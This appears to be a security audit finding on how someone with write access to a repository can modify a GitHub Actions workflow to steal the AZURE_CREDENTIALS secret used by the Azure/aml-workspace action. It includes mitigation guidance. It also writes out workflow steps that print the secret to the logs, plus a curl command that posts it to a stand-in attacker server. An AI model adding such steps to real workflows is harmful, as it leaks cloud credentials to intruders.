### Vulnerability List

- Vulnerability Name: Secret Exfiltration via Workflow Modification
- Description:
    1. An attacker gains write access to the GitHub repository where the GitHub Action `Azure/aml-workspace` is used. This could be achieved by compromising a repository collaborator account or exploiting a vulnerability in a GitHub App with write permissions.
    2. The attacker modifies the GitHub Actions workflow YAML file that uses the `Azure/aml-workspace` action.
    3. The attacker adds a new step to the workflow that is designed to exfiltrate the `AZURE_CREDENTIALS` secret. This can be done by:
        - Modifying an existing step to print the `AZURE_CREDENTIALS` environment variable to the workflow logs, which the attacker can later access.
        - Adding a new step that sends the `AZURE_CREDENTIALS` environment variable to an external attacker-controlled server (e.g., using `curl` or `nc`).
    4. When the workflow is triggered (e.g., by a push or pull request), the modified workflow executes, and the `AZURE_CREDENTIALS` secret is exfiltrated.
    5. The attacker obtains the `AZURE_CREDENTIALS` which includes `clientId`, `clientSecret`, `subscriptionId`, and `tenantId`.
    6. Using these credentials, the attacker can now authenticate to Azure and potentially gain unauthorized access to the Azure Machine Learning workspace and other Azure resources within the scope of the service principal associated with `AZURE_CREDENTIALS`.
- Impact:
    - Unauthorized access to the Azure Machine Learning workspace.
    - Potential unauthorized access to other Azure resources if the service principal associated with `AZURE_CREDENTIALS` has broader permissions.
    - Data breach if sensitive data is stored within the Azure Machine Learning workspace or accessible through it.
    - Malicious activities within the Azure subscription, such as creating or deleting resources, training models with malicious data, or deploying rogue models.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - The action itself uses `mask_parameter` to mask the `AZURE_CREDENTIALS` in the GitHub Actions workflow logs. This mitigation is implemented in `/code/code/utils.py` in the `mask_parameter` function and used in `/code/code/main.py` to mask parts of the `azure_credentials`.
    - Input validation is performed on `azure_credentials` using JSON schema validation in `/code/code/main.py` and `/code/code/utils.py` with schema defined in `/code/code/schemas.py`. This helps ensure the input is in the expected format but does not prevent exfiltration if an attacker modifies the workflow.
- Missing Mitigations:
    - **Principle of Least Privilege Documentation**:  Stronger emphasis in the README and documentation on the principle of least privilege for the service principal used for `AZURE_CREDENTIALS`. Users should be guided to grant the service principal only the necessary permissions (ideally scoped to the specific resource group and Azure ML workspace) to minimize the impact of credential compromise. While the README mentions `--role contributor`, it should be highlighted that contributor role might be overly permissive and users should consider custom roles with minimal required permissions.
    - **Workflow Security Hardening Guidance**: Documentation should include best practices for securing GitHub Actions workflows, such as:
        - Regularly auditing repository collaborators and their permissions.
        - Reviewing and auditing workflow changes, especially from contributors with write access.
        - Considering branch protection rules to prevent unauthorized workflow modifications.
        - Using GitHub's security features like dependabot to keep dependencies updated.
- Preconditions:
    - An attacker must gain write access to the GitHub repository where the `Azure/aml-workspace` action is used.
    - The repository must be using the `Azure/aml-workspace` GitHub Action and storing Azure credentials as a GitHub secret named `AZURE_CREDENTIALS`.
- Source Code Analysis:
    1. **Workflow Modification Point**: The vulnerability is not within the action's code itself but in the workflow definition where the action is used. An attacker modifies the workflow YAML file in the repository.
    2. **Secret Access**: GitHub Actions secrets are exposed as environment variables to the actions within a workflow. The `AZURE_CREDENTIALS` secret becomes available as an environment variable, typically named `INPUT_AZURE_CREDENTIALS` based on the `action.yml` definition.
    3. **Exfiltration Step**: The attacker can add a step like this to the workflow YAML after the `Azure/aml-workspace` action step:
        ```yaml
        - name: Exfiltrate Secret
          run: |
            echo "::warning::AZURE_CREDENTIALS=${{ secrets.AZURE_CREDENTIALS }}"
            # Alternatively, send to attacker server:
            # curl -X POST -H "Content-Type: application/json" -d '{"secret":"${{ secrets.AZURE_CREDENTIALS }}"}' https://attacker.example.com/exfiltrate
        ```
        - Using `secrets.AZURE_CREDENTIALS` directly in `run` will print the secret value to the logs, even though it's defined as a secret. While GitHub attempts to mask these, the masking is not foolproof, especially in error messages or if the attacker uses more sophisticated exfiltration techniques. Writing to `::warning::` or `::error::` might bypass some masking attempts. Sending to an external server is a more direct exfiltration method.
    4. **No Code Vulnerability in Action**: The `Azure/aml-workspace` action code (`main.py`, `utils.py`, `schemas.py`) itself does not have a vulnerability that directly leads to secret exposure. The vulnerability lies in the potential for workflow modification and the inherent way GitHub Actions secrets are made available as environment variables. The `mask_parameter` in `/code/code/utils.py` is a mitigation attempt for log exposure, but it doesn't prevent exfiltration through workflow modification.

- Security Test Case:
    1. **Prerequisites**:
        - You need write access to a GitHub repository that uses the `Azure/aml-workspace` action.
        - The repository must have the `AZURE_CREDENTIALS` secret configured.
        - You need an attacker-controlled server to receive exfiltrated data (for the more direct exfiltration test). For simpler demonstration, observing workflow logs is sufficient.
    2. **Steps**:
        - Fork or create a repository that uses the `Azure/aml-workspace` action and has `AZURE_CREDENTIALS` configured.
        - Modify the workflow YAML file (e.g., `.github/workflows/main.yml`) to add an exfiltration step after the `Azure/aml-workspace` action step:
            ```yaml
            - uses: Azure/aml-workspace@v1
              id: aml_workspace
              with:
                azure_credentials: ${{ secrets.AZURE_CREDENTIALS }}

            - name: Exfiltrate Secret to Logs
              run: echo "::warning::EXFILTRATED_SECRET=${{ secrets.AZURE_CREDENTIALS }}"
            ```
        - Commit and push the modified workflow to the repository.
        - Trigger the workflow (e.g., by pushing a dummy commit or manually triggering it).
        - Go to the Actions tab in the GitHub repository and view the logs for the workflow run that executed the modified workflow.
        - Observe the logs for the "Exfiltrate Secret to Logs" step. You should see a warning message with the `AZURE_CREDENTIALS` content printed, or at least parts of it, despite GitHub's secret masking. If sending to an external server was used, check the attacker-controlled server logs for the received secret.
    3. **Expected Result**:
        - The `AZURE_CREDENTIALS` secret (or parts of it) is visible in the workflow logs, demonstrating successful exfiltration. If an external server was used, the secret is received on the attacker's server.
    4. **Cleanup**:
        - Remove the exfiltration step from the workflow YAML file and commit the changes to remediate the vulnerability in the test repository.
